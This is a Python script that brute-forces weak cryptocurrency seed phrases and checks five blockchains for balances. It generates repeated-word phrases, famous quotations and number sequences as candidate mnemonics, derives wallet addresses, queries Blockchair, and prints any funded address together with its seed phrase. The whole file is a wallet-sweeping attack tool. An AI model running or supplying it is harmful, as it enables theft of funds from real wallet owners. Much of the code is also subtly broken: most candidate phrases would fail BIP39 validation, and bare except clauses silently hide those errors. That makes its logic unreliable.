import time
import requests
from bip_utils import (
    Bip44, Bip44Coins, Bip44Changes,
    Bip39MnemonicGenerator, Bip39SeedGenerator,
    Bip39WordsNum, Bip39WordsList, Bip39MnemonicValidator
)

CHAINS = {
    "Ethereum": (Bip44Coins.ETHEREUM, "ethereum", 18),
    "Bitcoin": (Bip44Coins.BITCOIN, "bitcoin", 8),
    "Litecoin": (Bip44Coins.LITECOIN, "litecoin", 8),
    "Bitcoin Cash": (Bip44Coins.BITCOIN_CASH, "bitcoin-cash", 8),
    "Dogecoin": (Bip44Coins.DOGECOIN, "dogecoin", 8),
}

BLOCKCHAIR_URL = "https://api.blockchair.com/{chain}/dashboards/address/{address}"

def derive_address(mnemonic, coin, index=0):
    seed = Bip39SeedGenerator(mnemonic).Generate()
    ctx = Bip44.FromSeed(seed, coin)
    acct = ctx.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(index)
    return acct.PublicKey().ToAddress()

def check_balance(chain_slug, address, decimals):
    url = BLOCKCHAIR_URL.format(chain=chain_slug, address=address)
    try:
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            data = r.json()["data"]
            if address in data:
                bal = data[address]["address"]["balance"]
                return bal / (10**decimals)
    except:
        pass
    return 0.0

def weak_phrase_generator():
    # 1) All the same word repeated 12 times (2048 seeds)
    words = Bip39WordsList(Bip39WordsNum.WORDS_NUM_12).ToList()
    for w in words:
        yield " ".join([w]*12)

    # 2) Famous phrases
    famous = [
        "it was a bright cold day in april and the clocks were striking thirteen",
        "the quick brown fox jumps over the lazy dog many times today",
        "to be or not to be that is the question of our lives",
        "in the beginning god created the heavens and the earth and the light",
        "one small step for man one giant leap for mankind forever remembered",
        "we the people of the united states in order to form a union",
        "life is what happens when you are busy making other plans for tomorrow",
        "all you need is love love is all you need the beatles sang",
        "imagine there is no heaven its easy if you try no hell below us",
        "the only thing we have to fear is fear itself the president said",
    ]
    for phrase in famous:
        tokens = phrase.lower().split()
        if len(tokens) == 12:
            yield " ".join(tokens)

    # 3) Number sequences
    number_words = [
        "zero one two three four five six seven eight nine ten eleven".split(),
        "first second third fourth fifth sixth seventh eighth ninth tenth eleventh twelfth".split(),
    ]
    for seq in number_words:
        if len(seq) == 12:
            yield " ".join(seq)

print("Starting full weak‑pattern wallet search...\n")

checked = 0
for mnemonic in weak_phrase_generator():
    checked += 1
    if checked % 50 == 0:
        print(f"Checked {checked} seeds...")
    for name, (coin, slug, dec) in CHAINS.items():
        try:
            addr = derive_address(mnemonic, coin, 0)
            bal = check_balance(slug, addr, dec)
            if bal > 0:
                print("=" * 50)
                print(f"FUNDS FOUND! {name}: {bal}")
                print(f"Address: {addr}")
                print(f"Seed phrase: {mnemonic}")
                print("=" * 50)
        except:
            pass
        time.sleep(0.3)   # stay under Blockchair rate limit
    time.sleep(0.1)

print(f"\nDone. Checked {checked} seeds.")
